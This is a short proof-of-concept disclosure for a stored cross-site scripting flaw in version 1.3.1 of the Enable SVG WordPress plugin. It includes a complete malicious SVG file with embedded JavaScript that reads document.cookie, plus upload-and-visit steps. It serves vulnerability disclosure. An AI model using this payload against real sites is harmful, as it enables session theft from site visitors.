# Cross Site Scripting Through SVG Files in Enable SVG Wordpress Plugin

This PoC describe how to exploit a Cross-Site Scripting (XSS) in - Wordpress Enable SVG version 1.3.1

# Description

Enable SVG v1.3.1 plugin for Wordpress does not sanitize the SVG Files, so it is possible to upload a malicious SVG File to get a XSS.

![1](https://user-images.githubusercontent.com/70114276/166156420-9dfb6566-24fc-4687-bced-bdf763682884.png)

![2](https://user-images.githubusercontent.com/70114276/166156424-61bac93c-9cb2-4826-98ee-b275cea20650.png)

## Attack Scenario

First we create our SVG file with this content:

![image](https://user-images.githubusercontent.com/70114276/166156512-3992cceb-1c65-468e-8fd2-909981f70ffe.png)

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>
```

Then we upload the file to WordPress

![image](https://user-images.githubusercontent.com/70114276/166156346-fdba90d1-d67d-4124-adf3-c8c1177f4db3.png)

To validate the PoC, simply access the directory where the file was sent.

![image](https://user-images.githubusercontent.com/70114276/166156294-59e3d5b1-20d0-4e41-bcfd-7861bb0dbfb7.png)
